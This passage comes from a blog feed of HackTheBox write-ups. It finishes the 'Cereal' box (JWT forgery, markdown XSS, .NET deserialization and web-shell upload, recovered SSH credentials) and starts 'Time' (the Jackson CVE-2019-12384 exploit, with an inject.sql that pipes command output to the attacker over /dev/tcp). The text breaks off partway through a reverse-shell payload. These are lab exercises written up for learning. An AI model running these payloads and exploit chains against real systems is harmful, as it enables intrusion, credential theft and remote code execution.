	<span style="color:#a6e22e">CreateToken</span>(<span style="color:#a6e22e">userID</span> <span style="color:#66d9ef">string</span>) <span style="color:#66d9ef">string</span>
}

<span style="color:#66d9ef">type</span> <span style="color:#a6e22e">jwtService</span> <span style="color:#66d9ef">struct</span> {
	<span style="color:#a6e22e">secretKey</span> <span style="color:#66d9ef">string</span>
}

<span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">s</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">jwtService</span>) <span style="color:#a6e22e">CreateToken</span>() <span style="color:#66d9ef">string</span> {
	<span style="color:#a6e22e">claims</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">jwt</span>.<span style="color:#a6e22e">StandardClaims</span>{
		<span style="color:#a6e22e">ExpiresAt</span>: <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Now</span>().<span style="color:#a6e22e">AddDate</span>(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">7</span>).<span style="color:#a6e22e">UTC</span>().<span style="color:#a6e22e">Unix</span>(),
	}

	<span style="color:#a6e22e">token</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">jwt</span>.<span style="color:#a6e22e">NewWithClaims</span>(<span style="color:#a6e22e">jwt</span>.<span style="color:#a6e22e">SigningMethodHS256</span>, <span style="color:#a6e22e">claims</span>)
	<span style="color:#a6e22e">t</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">token</span>.<span style="color:#a6e22e">SignedString</span>([]byte(<span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">secretKey</span>))
	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
		panic(<span style="color:#a6e22e">err</span>)
	}
	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">t</span>
}

<span style="color:#66d9ef">type</span> <span style="color:#a6e22e">User</span> <span style="color:#66d9ef">struct</span> {
	<span style="color:#a6e22e">UserId</span>   <span style="color:#66d9ef">string</span> <span style="color:#e6db74">`json:&#34;userId,omitempty&#34;`</span>
	<span style="color:#a6e22e">Username</span> <span style="color:#66d9ef">string</span> <span style="color:#e6db74">`json:&#34;username,omitempty&#34;`</span>
	<span style="color:#a6e22e">Token</span>    <span style="color:#66d9ef">string</span> <span style="color:#e6db74">`json:&#34;token,omitempty&#34;`</span>
}

<span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
	<span style="color:#a6e22e">jwt</span> <span style="color:#f92672">:=</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">jwtService</span>{}
	<span style="color:#a6e22e">jwt</span>.<span style="color:#a6e22e">secretKey</span> = <span style="color:#e6db74">&#34;secretlhfIH&amp;FY*#oysuflkhskjfhefesf&#34;</span>

	<span style="color:#a6e22e">cu</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">User</span>{
		<span style="color:#a6e22e">UserId</span>:   <span style="color:#e6db74">&#34;1&#34;</span>,
		<span style="color:#a6e22e">Username</span>: <span style="color:#e6db74">&#34;iamf&#34;</span>,
		<span style="color:#a6e22e">Token</span>:    <span style="color:#a6e22e">jwt</span>.<span style="color:#a6e22e">CreateToken</span>(),
	}

	<span style="color:#a6e22e">currentUser</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">json</span>.<span style="color:#a6e22e">Marshal</span>(<span style="color:#a6e22e">cu</span>)
	<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;%s&#34;</span>, <span style="color:#a6e22e">currentUser</span>)
}
</code></pre></div><p>A bit messy but that&rsquo;s work.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «cereal» «10.10.14.3»
$ go run main.go
<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;userId&#34;</span>:<span style="color:#e6db74">&#34;1&#34;</span>,<span style="color:#e6db74">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;iamf&#34;</span>,<span style="color:#e6db74">&#34;token&#34;</span>:<span style="color:#e6db74">&#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2MjM4MTgwMzh9.XAcgRqhpgyJARsBMEWg1UOlUeRnQU4bvbk1SpAv3vDM&#34;</span><span style="color:#f92672">}</span>
</code></pre></div><h4 id="login">Login</h4>
<p>Refreshing the page after storing the token into the browser&rsquo;s local storage logs me in.</p>
<p><div class="img-container"><img src="imgs/image-20210609113605143.png" alt="image-20210609113605143"  /></div>
</p>
<h4 id="input-testing">Input testing</h4>
<p>When I submitted a URL which points to my attacking machine, I received a GET request coming from the Title field.</p>
<p><div class="img-container"><img src="imgs/image-20210605163056142.png" alt="image-20210605163056142"  /></div>
</p>
<p>Here how the request and response looks like.</p>
<p><div class="img-container"><img src="imgs/image-20210605183457568.png" alt="image-20210605183457568"  /></div>
</p>
<h3 id="source--code-analysis-2">Source  Code Analysis #2</h3>
<p>I decided to mix it with images hehe.</p>
<h4 id="deserialization-vulnerability">Deserialization Vulnerability</h4>
<p>Looking into the request controller,  <code>Controllers/RequestsController.cs</code>, it turns out that each cereal request (POST) sent is saved in database without validation on the body request.</p>
<p><div class="img-container"><img src="imgs/image-20210609115652148.png" alt="image-20210609115652148"  /></div>
</p>
<p>Because the validation only is on the client side, I could send a cereal request in any format. Here is for example of what I mean:</p>
<p><div class="img-container"><img src="imgs/image-20210609122743196.png" alt="image-20210609122743196"  /></div>
</p>
<p>The cereal database&rsquo;s name can be found inside  <code>CerealContext.cs</code></p>
<p><div class="img-container"><img src="imgs/image-20210609120019771.png" alt="image-20210609120019771"  /></div>
</p>
<p>Back into the request controller, there is a comment inside the get function that points out about deserialization (previously seen at comparing the commit logs):</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#">....
<span style="color:#a6e22e">        [Authorize(Policy = &#34;RestrictIP&#34;)]</span>
<span style="color:#a6e22e">        [HttpGet(&#34;{id}&#34;)]</span>
        <span style="color:#66d9ef">public</span> IActionResult Get(<span style="color:#66d9ef">int</span> id)
        {
            <span style="color:#66d9ef">using</span> (<span style="color:#66d9ef">var</span> db = <span style="color:#66d9ef">new</span> CerealContext())
            {
                <span style="color:#66d9ef">string</span> json = db.Requests.Where(x =&gt; x.RequestId == id).SingleOrDefault().JSON;
                <span style="color:#75715e">// Filter to prevent deserialization attacks mentioned here: https://github.com/pwntester/ysoserial.net/tree/master/ysoserial
</span><span style="color:#75715e"></span>                <span style="color:#66d9ef">if</span> (json.ToLower().Contains(<span style="color:#e6db74">&#34;objectdataprovider&#34;</span>) || json.ToLower().Contains(<span style="color:#e6db74">&#34;windowsidentity&#34;</span>) || json.ToLower().Contains(<span style="color:#e6db74">&#34;system&#34;</span>))
                {
                    <span style="color:#66d9ef">return</span> BadRequest(<span style="color:#66d9ef">new</span> { message = <span style="color:#e6db74">&#34;The cereal police have been dispatched.&#34;</span> });
                }
                <span style="color:#66d9ef">var</span> cereal = JsonConvert.DeserializeObject(json, <span style="color:#66d9ef">new</span> JsonSerializerSettings
                {
                    TypeNameHandling = TypeNameHandling.Auto
                });
                <span style="color:#66d9ef">return</span> Ok(cereal.ToString());
            }
        }
</code></pre></div><p>The get function can only be access if the request IP is in the whitelist which is defined in <code>appsettings.json</code> and it takes one parameter called <code>id</code> (GET <code>/requests/{id}</code>).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#a6e22e">[Authorize(Policy = &#34;RestrictIP&#34;)]</span>
<span style="color:#a6e22e">[HttpGet(&#34;{id}&#34;)]</span>
</code></pre></div><p>This code blocks the gadgets class used  in .NET deserialization attack.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>json.ToLower<span style="color:#f92672">()</span>.Contains<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;objectdataprovider&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">||</span> json.ToLower<span style="color:#f92672">()</span>.Contains<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;windowsidentity&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">||</span> json.ToLower<span style="color:#f92672">()</span>.Contains<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;system&#34;</span><span style="color:#f92672">))</span>
</code></pre></div><p>But there is a class called <code>DownloadHelper</code> that has function that allows to send a download request:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#">....
    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DownloadHelper</span>
    {
        <span style="color:#66d9ef">private</span> String <span style="color:#ae81ff">_</span>URL;
        <span style="color:#66d9ef">private</span> String <span style="color:#ae81ff">_F</span>ilePath;
        <span style="color:#66d9ef">public</span> String URL
....
        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> Download()
        {
            <span style="color:#66d9ef">using</span> (WebClient wc = <span style="color:#66d9ef">new</span> WebClient())
            {
                <span style="color:#66d9ef">if</span> (!<span style="color:#66d9ef">string</span>.IsNullOrEmpty(<span style="color:#ae81ff">_</span>URL) &amp;&amp; !<span style="color:#66d9ef">string</span>.IsNullOrEmpty(<span style="color:#ae81ff">_F</span>ilePath))
                {
                    wc.DownloadFile(<span style="color:#ae81ff">_</span>URL, ReplaceLastOccurrence(<span style="color:#ae81ff">_F</span>ilePath,<span style="color:#e6db74">&#34;\\&#34;</span>, <span style="color:#e6db74">&#34;\\21098374243-&#34;</span>));
                }
            }
        }
</code></pre></div><p>I could use <code>DownloadHelper</code> class to download a web shell hosted on my machine by sending a serialized form of this class via cereal request.</p>
<p>The problem here I couldn&rsquo;t make a GET request to <code>requests/{id}</code>  because there is an IP restriction policy.</p>
<h4 id="xss-vulnerability">XSS Vulnerability</h4>
<p>When tracking down where the previous SSRF coming, it looks like each cereal request sent lands on the admin page (<code>AdminPage.jsx</code>).</p>
<p><div class="img-container"><img src="imgs/image-20210609114906150.png" alt="image-20210609114906150"  /></div>
</p>
<p>And one of the app library that is used in the admin page called <code>react-marked-down</code> has an <a href="https://hackerone.com/reports/344069">XSS vulnerability</a>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">....
<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">Accordion</span>.<span style="color:#a6e22e">Toggle</span> <span style="color:#a6e22e">as</span><span style="color:#f92672">=</span>{<span style="color:#a6e22e">Button</span>} <span style="color:#a6e22e">variant</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;link&#34;</span> <span style="color:#a6e22e">eventKey</span><span style="color:#f92672">=</span>{<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">props</span>.<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">requestId</span>} <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;expand&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span>{<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">props</span>.<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">requestId</span>}<span style="color:#f92672">&gt;</span>
    {<span style="color:#a6e22e">requestData</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">requestData</span>.<span style="color:#a6e22e">title</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">requestData</span>.<span style="color:#a6e22e">title</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;string&#39;</span> <span style="color:#f92672">&amp;&amp;</span> 
        <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">MarkdownPreview</span> <span style="color:#a6e22e">markedOptions</span><span style="color:#f92672">=</span>{{ <span style="color:#a6e22e">sanitize</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span> }} <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span>{<span style="color:#a6e22e">requestData</span>.<span style="color:#a6e22e">title</span>} <span style="color:#f92672">/&gt;</span> <span style="color:#75715e">// &lt;==
</span><span style="color:#75715e"></span>....
</code></pre></div><p>I could confirms the vulnerability with the following payload:</p>
<pre><code>[XSS](javascript: document.write`&lt;img src='http://10.10.14.3/iamf'/&gt;`)
</code></pre><p><div class="img-container"><img src="imgs/image-20210605212246743.png" alt="image-20210605212246743"  /></div>
</p>
<p>With a few experiments, URL encoding seems to work as well</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-markdown" data-lang="markdown">[<span style="color:#f92672">XSS</span>](<span style="color:#a6e22e">javascript: document.write%28%22&lt;img src=&#39;http://10.10.14.3/iamf&#39;&gt;%22%29</span>)
</code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-sonny">Shell as Sonny</h3>
<h4 id="web-shell-upload-via-deserialization-attack-xss-and-ssrf">Web Shell Upload via Deserialization attack, XSS, and SSRF</h4>
<p>First, I&rsquo;ll summarize all the information:</p>
<ul>
<li>There is an uploads directory at <code>https://source.cereal.htb/uploads/</code></li>
<li>From the previous code analysis, the gadget class are filtered, but there is one class called DownloadHelper that can be accessed and it has a download function.</li>
<li>There is a SSRF in the Title section, which can be used along with the XSS vulnerability to bypass the IP restriction.</li>
</ul>
<p>The tactics:</p>
<ul>
<li>Send the <a href="https://docs.microsoft.com/en-us/dotnet/standard/serialization/system-text-json-how-to?pivots=dotnet-5-0">serialized</a> <code>DownloadHelper</code> class which contains a web shell URL that points to the attacking machine via cereal request, note the ID</li>
<li>Use XSS which bypasses the IP restriction, to make a GET request to <code>cereal.htb/request/{the ID}</code> to trigger the deserialization,</li>
<li>Confirms the web shell at <code>https://cereal.source.htb/uploads/shell-name.aspx</code></li>
</ul>
<p>I already made a <a href="https://gist.github.com/fahmifj/c935b12c4b0a66ee30a7aa825d3c7fe1">script</a> to chain those vulnerabilities:</p>
<p><div class="img-container"><img src="imgs/image-20210609125605658.png" alt="image-20210609125605658"  /></div>
</p>
<blockquote>
<p>That&rsquo;s on different IP because I decided to ran the exploit again to make sure it&rsquo;s still work XD</p>
</blockquote>
<p>I can access my web shell on <code>http://source.cereal.htb/uploads/iamf.aspx</code></p>
<p><div class="img-container"><img src="imgs/image-20210609125710180.png" alt="image-20210609125710180"  /></div>
</p>
<h3 id="ssh---sonny">SSH - sonny</h3>
<p>A quick check on the web directory, I find the <code>cereal.db</code> at <code>c:\inetpub\cereal\db\cereal.db</code> and it contains a string that looks like a set of credentials.</p>
<p><div class="img-container"><img src="imgs/image-20210609133307066.png" alt="image-20210609133307066"  /></div>
</p>
<p>The password works on SSH: <code>sonny:mutual.madden.manner38974</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.2» 
$ ssh sonny@cereal.htb
sonny@cereal.htb<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
Microsoft Windows <span style="color:#f92672">[</span>Version 10.0.17763.1817<span style="color:#f92672">]</span>
<span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2018</span> Microsoft Corporation. All rights reserved.

sonny@CEREAL C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>onny&gt;dir desktop<span style="color:#ae81ff">\ </span>
 Volume in drive C has no label.                   
 Volume Serial Number is C4EF-2153                 
                                                   
 Directory of C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>onny<span style="color:#ae81ff">\d</span>esktop               
                                                   
11/16/2020  05:19 AM    &lt;DIR&gt;          .           
11/16/2020  05:19 AM    &lt;DIR&gt;          ..          
06/07/2021  09:59 PM                <span style="color:#ae81ff">34</span> user.txt    
               <span style="color:#ae81ff">1</span> File<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>             <span style="color:#ae81ff">34</span> bytes      
               <span style="color:#ae81ff">2</span> Dir<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>   7,621,619,712 bytes free 
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<p>Still in progress.. but I&rsquo;m too excited to post this.</p>
<p>[-To be continued&hellip;-]</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://curity.io/resources/learn/jwt-best-practices/#4-always-check-the-issuer">https://curity.io/resources/learn/jwt-best-practices/#4-always-check-the-issuer</a></li>
<li><a href="https://docs.microsoft.com/en-us/dotnet/standard/serialization/system-text-json-how-to?pivots=dotnet-5-0">https://docs.microsoft.com/en-us/dotnet/standard/serialization/system-text-json-how-to?pivots=dotnet-5-0</a></li>
<li><a href="https://stackoverflow.com/questions/40898632/parentheses-alternatives-in-js-if-any">https://stackoverflow.com/questions/40898632/parentheses-alternatives-in-js-if-any</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Time</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-time/</link>
      <pubDate>Sun, 09 May 2021 05:43:58 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-time/</guid>
      <description>Deserialization attack on Jackson library</description>
      <content:encoded><![CDATA[<p>Time is a medium difficulty Linux machine from HackTheBox that features a web application which provides JSON beautifier and validator services. Testing some invalid inputs exposes the application error message, indicating it backed with Jackson library. Searching for the error message on Google leads to a research blog about deserialization on Jackson. After reproducing the steps from the blog, I&rsquo;m able to gain a foothold on the box. Enumerating the files discovers a timer script that is executed by the root user every 10 seconds. The script is world-writable, allowing me to inject a malicious code and obtain a root shell.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>Deserialization Attack</li>
<li>Mitigation CVE-2019-12384</li>
<li>Exploiting Systemd timers</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p><code>nmap</code> discovers two open ports: SSH on port 22, and a HTTP web server on port 80.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «time» «10.10.14.19» 
$ mkdir nmap; nmap -sC -sV -oA nmap/10-initial-time 10.10.10.214 
Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-05-08 07:29 EDT
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.214
Host is up <span style="color:#f92672">(</span>0.069s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">998</span> closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
80/tcp open  http    Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
|_http-title: Online JSON parser
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 27.18 seconds
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Visiting port 80 shows a website called &ldquo;Online JSON Beautifier &amp; Validator&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210508184016068.png" alt="image-20210508184016068"  /></div>
</p>
<p>Clicking on the drop down menu, it provides two options: &ldquo;Beautify&rdquo; and &ldquo;Validate (beta!)&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210508184059429.png" alt="image-20210508184059429"  /></div>
</p>
<h4 id="testing-inputs">Testing Inputs</h4>
<p>I submitted <code>{&quot;test&quot;: &quot;iamf&quot;}</code> to the input box and clicked the &ldquo;Process&rdquo; button. As expected, the beautify option just a JSON beautifier like <a href="https://stedolan.github.io/jq/">jq</a>.</p>
<p><div class="img-container"><img src="imgs/image-20210508184420130.png" alt="image-20210508184420130"  /></div>
</p>
<p>I submitted the same input on &ldquo;Validate (beta!)&rdquo;, but this time it returns the following error.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210508184904577.png" alt="image-20210508184904577"  /></div>
</p>
<p>I found this <a href="https://www.baeldung.com/jackson-inheritance#1-global-default-typing">site</a> while searching for the error message on Google. It turned out it wanted an array input, so I copied the sample input from that site and pasted it to the validator.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">[ 
<span style="color:#e6db74">&#34;org.baeldung.jackson.inheritance.Truck&#34;</span>,
{ <span style="color:#f92672">&#34;make&#34;</span>: <span style="color:#e6db74">&#34;Isuzu&#34;</span>, <span style="color:#f92672">&#34;model&#34;</span>: <span style="color:#e6db74">&#34;NQR&#34;</span>,<span style="color:#f92672">&#34;payloadCapacity&#34;</span>: <span style="color:#ae81ff">7500.0</span> }
]
</code></pre></div><p>And now it returns a different error message.</p>
<p><div class="img-container"><img src="imgs/image-20210508195850042.png" alt="image-20210508195850042"  /></div>
</p>
<p>And that&rsquo;s because it probably can&rsquo;t find <code>org.baeldung.jackson.inheritance.Truck</code> since I made it up.</p>
<h4 id="finding-vulnerability">Finding Vulnerability</h4>
<p>I might be able to inject the &ldquo;<code>org.baeldung.jackson.inheritance.Truck</code>&rdquo; with a java gadget class for deserialization attack, and after searching around about deserialization topics on Jackson, I found this two blog posts about Jackson RCE:</p>
<ul>
<li><a href="https://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/">Exploiting the Jackson RCE: CVE-2017-7525 - Adam Caudill</a></li>
<li><a href="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html">Jackson gadgets - Anatomy of a vulnerability · Doyensec&rsquo;s Blog</a></li>
</ul>
<p>However, the post on Doyensec&rsquo;s blog is newer (2019 vs 2017), so I dig into that blog. The researcher on that blog uses <code>ch.qos.logback.core.db.DriverManagerConnectionSource</code> as his gadget class, leveraging the alias feature from the H2 database to execute arbitrary code. This research is classified as CVE-2019-12384.</p>
<p>Below is the example payload used.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">[<span style="color:#e6db74">&#34;ch.qos.logback.core.db.DriverManagerConnectionSource&#34;</span>, {<span style="color:#f92672">&#34;url&#34;</span>:<span style="color:#e6db74">&#34;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#39;http://localhost:8000/inject.sql&#39;&#34;</span>}]
</code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-pericles">Shell as pericles</h3>
<h4 id="exploiting-jackson-cve-2019-12384">Exploiting Jackson CVE-2019-12384</h4>
<p>I&rsquo;ll use the research from Doyensec&rsquo;s blog above as my reference.</p>
<p>First, I&rsquo;ll create a copy of the <code>inject.sql</code> file that is used by the researcher.</p>
<p><code>inject.sql</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">CREATE ALIAS SHELLEXEC AS $$ String <span style="color:#a6e22e">shellexec</span><span style="color:#f92672">(</span>String cmd<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> java<span style="color:#f92672">.</span><span style="color:#a6e22e">io</span><span style="color:#f92672">.</span><span style="color:#a6e22e">IOException</span> <span style="color:#f92672">{</span>
	String<span style="color:#f92672">[]</span> command <span style="color:#f92672">=</span> <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;bash&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;-c&#34;</span><span style="color:#f92672">,</span> cmd<span style="color:#f92672">};</span>
	java<span style="color:#f92672">.</span><span style="color:#a6e22e">util</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Scanner</span> s <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> java<span style="color:#f92672">.</span><span style="color:#a6e22e">util</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Scanner</span><span style="color:#f92672">(</span>Runtime<span style="color:#f92672">.</span><span style="color:#a6e22e">getRuntime</span><span style="color:#f92672">().</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span>command<span style="color:#f92672">).</span><span style="color:#a6e22e">getInputStream</span><span style="color:#f92672">()).</span><span style="color:#a6e22e">useDelimiter</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\\A&#34;</span><span style="color:#f92672">);</span>
	<span style="color:#66d9ef">return</span> s<span style="color:#f92672">.</span><span style="color:#a6e22e">hasNext</span><span style="color:#f92672">()</span> <span style="color:#f92672">?</span> s<span style="color:#f92672">.</span><span style="color:#a6e22e">next</span><span style="color:#f92672">()</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">;</span>  <span style="color:#f92672">}</span>
$$<span style="color:#f92672">;</span>
CALL <span style="color:#a6e22e">SHELLEXEC</span><span style="color:#f92672">(</span><span style="color:#960050;background-color:#1e0010">&#39;</span>id <span style="color:#f92672">&gt;</span> <span style="color:#f92672">/</span>dev<span style="color:#f92672">/</span>tcp<span style="color:#f92672">/</span>10<span style="color:#f92672">.</span><span style="color:#a6e22e">10</span><span style="color:#f92672">.</span><span style="color:#a6e22e">14</span><span style="color:#f92672">.</span><span style="color:#a6e22e">19</span><span style="color:#f92672">/</span>9000<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">)</span>
</code></pre></div><p>Then, I&rsquo;ll setup a Python web server to host the SQL file and an <code>nc</code> listener to catch the request.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «time» «10.10.14.19» 
$ python3 -m http.server <span style="color:#ae81ff">80</span>
Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">80</span> <span style="color:#f92672">(</span>http://0.0.0.0:80/<span style="color:#f92672">)</span> ...
</code></pre></div><p>Now I&rsquo;ll use the following JSON payload and submit it to the validator.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">[<span style="color:#e6db74">&#34;ch.qos.logback.core.db.DriverManagerConnectionSource&#34;</span>, {<span style="color:#f92672">&#34;url&#34;</span>:<span style="color:#e6db74">&#34;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#39;http://10.10.14.19/inject.sql&#39;&#34;</span>}]
</code></pre></div><p>Within a few seconds, my Python web server receives a request for <code>inject.sql</code>, and my listener captures the output of the <code>id</code> command.</p>
<p><div class="img-container"><img src="imgs/image-20210508204955144.png" alt="image-20210508204955144"  /></div>
</p>
<p>Knowing this, I can weaponize the <code>inject.sql</code> file to send myself a shell, and then perform the same procedure as above.</p>
<h4 id="weaponization---reverse-shell">Weaponization - Reverse Shell</h4>
<p>Now with the following <code>inject.sql</code>,</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">CREATE ALIAS SHELLEXEC AS $$ String <span style="color:#a6e22e">shellexec</span><span style="color:#f92672">(</span>String cmd<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> java<span style="color:#f92672">.</span><span style="color:#a6e22e">io</span><span style="color:#f92672">.</span><span style="color:#a6e22e">IOException</span> <span style="color:#f92672">{</span>
	String<span style="color:#f92672">[]</span> command <span style="color:#f92672">=</span> <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;bash&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;-c&#34;</span><span style="color:#f92672">,</span> cmd<span style="color:#f92672">};</span>
